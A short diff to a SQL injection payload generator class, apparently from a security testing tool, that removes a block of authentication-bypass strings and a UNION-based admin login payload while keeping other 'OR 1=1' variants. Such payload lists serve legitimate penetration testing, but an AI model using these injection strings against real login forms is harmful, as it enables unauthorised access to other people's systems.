@@ -25,20 +25,6 @@ class SQLPayloadGenerator:
             "'))",
             "';",
             "\"",
-            "\" OR \"\"=\"",
-            "' OR ''='",
-            "' OR 1=1 -- ",
-            "\" OR 1=1 -- ",
-            "' OR '1'='1",
-            "' OR 1 -- ",
-            "' OR 1/*",
-            "\" OR \"1\"=\"1",
-            "\" OR 1 -- ",
-            "\" OR 1/*",
-            "or 1=1",
-            "or 1=1--",
-            "or 1=1#",
-            "or 1=1/*",
         ]
 
         # Boolean-based payloads
@@ -116,7 +102,6 @@ class SQLPayloadGenerator:
             "admin' OR 1=1--",
             "admin' OR 1=1#",
             "admin' OR 1=1/*",
-            "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
         ]
 
     def generate_mysql_payloads(self):
